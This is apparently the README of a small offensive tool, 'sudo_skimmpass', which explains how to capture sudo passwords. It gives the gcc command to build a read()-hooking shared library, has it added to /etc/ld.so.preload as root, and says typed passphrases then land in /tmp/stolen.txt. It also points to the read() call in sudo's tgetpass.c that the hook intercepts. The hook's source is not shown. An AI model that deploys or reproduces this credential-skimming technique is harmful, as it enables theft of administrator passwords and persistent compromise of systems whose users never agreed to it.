# sudo_skimmpass
## Hijacking sudo's call to read terminal's file descriptor to log user input


Compile using: `gcc -fPIC -shared -ldl sudo_lib_hook.c -o /tmp/cap_pass.so`

Then add the resulting shared library `/tmp/cap_pass.so` to the file `/etc/ld.so.preload`.
Note: *You will need to perform this action as root.*


You can now open a new terminal, and run `sudo su` and enter your passphrase.  You may
now log back out, and finally, check `/tmp/stolen.txt`.  It should now contain your
passphrase.

The abused function from sudo comes from the file `tgetpass.c` and the relevant call to
`read()` (line ~393 in commit 2a33699f8a0520161a8b507a9cb256802d6f45cb from sudo-project/sudo)
is:

```
  while (cp < ep) {
    nr = read(fd, &c, 1);
    if (nr != 1 || c == '\n' || c == '\r')
      break;
```

Where `nr = read(fd, &c, 1);` can be isolated and swapped out for our jacking library to read
and log entry from the terminal's file descriptor to a file.
